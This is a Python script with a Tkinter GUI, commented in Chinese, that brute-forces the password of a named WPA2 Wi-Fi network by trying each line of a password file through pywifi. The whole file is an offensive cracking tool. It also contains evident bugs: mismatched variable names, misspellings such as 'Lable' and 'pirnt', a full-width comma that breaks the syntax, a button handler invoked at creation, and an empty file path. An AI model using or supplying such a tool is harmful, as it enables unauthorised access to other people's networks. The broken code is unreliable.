#!/bin/env python
import time
import pywifi
from pywifi import const
from tkinter import *   # * init __all__ = [a,b]
from tkinter import messagebox  # 消息提示

# 读取密码本
def readPassWord():
    print("开始破解：")
    wifiname = entry.get()
    path = ''
    file = open(path,"r")
    while True:
        # 捕获异常
        try:
            
            # 读取文件
            pwdStr = file.readline()
            bool = wificonnect(pwdStr,wifiname)
            if bool:
                #print("密码正确",pwdStr)
                messagebox.showinfo("密码正常"，pwdStr)
                break
            else:
                text.insert(END,"密码错误:"+pwdStr)
                text.see(END)
                text.update()
                #print("密码不正确",pwdStr)
        except:
            # 跳出当前 继续进行
            continue
# 测试连接
def wificonnect(pwd,wifiname):
    wifi = pywifi.PyWiFi()
    ifeces = wifi.interfaces()[0]
    # 断开所有连接
    ifaces.disconnect()
    time.sleep(1)
    if ifaces.status() == const.IFACE_DISCONNECTED:
        # 创建Wi-Fi连接文件
        profile = pywifi.Profile()
        # 要连接的Wi-Fi名称
        profile.ssid = wifiname
        # wifi密码
        profile.key = pwd
        # 网卡开放
        profile.auth = const.AUTH_ALG_OPEN
        # 无线网卡的加密算法
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        # 加密的单元
        profile.cipher = const.CIPHER_TYPE_CCMP
        # 删除所有的Wi-Fi文件
        ifaces.remove_all_network_profiles()
        # 设定新的连接文件
        temp_profile = ifaces.add_network_profile(profile)
        # 连接新的Wi-Fi
        ifaces.connect(temp_profile)
        time.sleep(5)
        if ifaces.status() == const.IFACE_CONNECTED:
            return True
        else:
            return False
    else:
        pirnt("连接成功")

# 创建窗口
root = Tk()
# 窗口标题
root.title("Wi-Fi破解")
# 窗口大小
root.geometry("500x380+500+300")
# 窗口的位置
# root.geometry("+500+300")
# 标签控件
label = Lable(root,text="输入要破解的Wi-Fi名称：")
# 定位 网格式布局  pack 包  place 位置
label.grid(row=0,column=0)
# 输入控件
entry = Entry(root,font=("微软雅黑",20))
entry.grid(row=0,column=1)
# 列表框控件
text = Listbox(root,font=("微软雅黑",15),width=40,height=10)
# columnspan组件所跨越的列数
text.grid(row=1,columnspan=2)
# 按钮
button = Button(root,text="开始破解",width=10,height=2,command=readPassWord())
button.grid(row=2,columnspan=2)
# 显示窗口 消息循环
root.mainloop()



# readPassWord()
